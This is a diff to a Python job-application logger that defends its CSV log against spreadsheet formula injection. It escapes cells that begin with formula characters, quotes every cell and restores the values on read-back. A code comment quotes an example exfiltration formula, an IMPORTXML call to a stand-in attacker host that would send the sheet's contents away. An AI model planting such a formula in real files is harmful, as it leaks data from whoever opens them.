@@ -45,6 +45,29 @@ APPLIED_COLUMNS = [
 # what `status` may hold in applied_jobs.csv
 STATUSES = ('applied', 'needs_manual_apply', 'would_apply', 'failed')
 
+# A spreadsheet runs any cell starting with one of these as a formula, and the
+# log is full of text scraped from job boards: a posting titled
+# =IMPORTXML("https://attacker.example/?"&A1, ...) would run on import and could
+# send the sheet's contents away. From OWASP's CSV Injection page, including the
+# full-width forms some locales also treat as formula starts.
+FORMULA_START = ('=', '+', '-', '@', '\t', '\r', '\n', '＝', '＋', '－', '＠')
+ESCAPE = "'"
+
+
+def neutralise(value):
+    """'=1+2' -> "'=1+2": read as text, not run as a formula. Other values pass
+    through - including numbers, so a negative figure stays a number."""
+    if isinstance(value, str) and value.startswith(FORMULA_START):
+        return ESCAPE + value
+    return value
+
+
+def restore(value):
+    """Undo neutralise(), so the log reads back as the data that went in."""
+    if isinstance(value, str) and value.startswith(ESCAPE) and value[1:].startswith(FORMULA_START):
+        return value[1:]
+    return value
+
 
 def _key(item: dict) -> tuple:
     """Identity for deduping.
@@ -108,19 +131,18 @@ class ApplicationLog:
 
     Written as CSV so it drops straight into Google Sheets via File > Import;
     the columns are stable so re-imports line up.
+
+    Every cell is quoted and any that would start a formula is prefixed with an
+    apostrophe (OWASP CSV Injection). rows() undoes the prefix, so code reading
+    the log back sees the original values.
     """
 
     def __init__(self, path: str = 'applied_jobs.csv'):
         self.path = path
 
     def existing_keys(self) -> set[tuple[str | None, str | None]]:
-        keys = set()
-        if not os.path.exists(self.path):
-            return keys
-        with open(self.path, encoding='utf-8-sig', newline='') as handle:
-            for row in csv.DictReader(handle):
-                keys.add((row.get('source'), row.get('id')))
-        return keys
+        # via rows(), so an escaped id still matches the raw one being recorded
+        return {(row.get('source'), row.get('id')) for row in self.rows()}
 
     def record(self, entries: Iterable[tuple[Job, str, str]]) -> int:
         """entries: iterable of (job, status, note). Returns rows written."""
@@ -161,10 +183,14 @@ class ApplicationLog:
         is_new = not os.path.exists(self.path) or os.path.getsize(self.path) == 0
         # utf-8-sig so Sheets and Excel both read the currency symbols correctly
         with open(self.path, 'a', encoding='utf-8-sig', newline='') as handle:
-            writer = csv.DictWriter(handle, fieldnames=APPLIED_COLUMNS)
+            # QUOTE_ALL: a separator or quote inside scraped text cannot open a
+            # new cell and put a formula at its start
+            writer = csv.DictWriter(handle, fieldnames=APPLIED_COLUMNS, quoting=csv.QUOTE_ALL)
             if is_new:
                 writer.writeheader()
-            writer.writerows(fresh)
+            writer.writerows(
+                {column: neutralise(value) for column, value in row.items()} for row in fresh
+            )
         logger.info(f'{self.path}: recorded {len(fresh)} application(s)')
         return len(fresh)
 
@@ -173,7 +199,10 @@ class ApplicationLog:
         if not os.path.exists(self.path):
             return []
         with open(self.path, encoding='utf-8-sig', newline='') as handle:
-            return list(csv.DictReader(handle))
+            return [
+                {column: restore(value) for column, value in row.items()}
+                for row in csv.DictReader(handle)
+            ]
 
     def counts(self) -> dict[str, int]:
         """status -> how many rows hold it. The at-a-glance view of a run."""
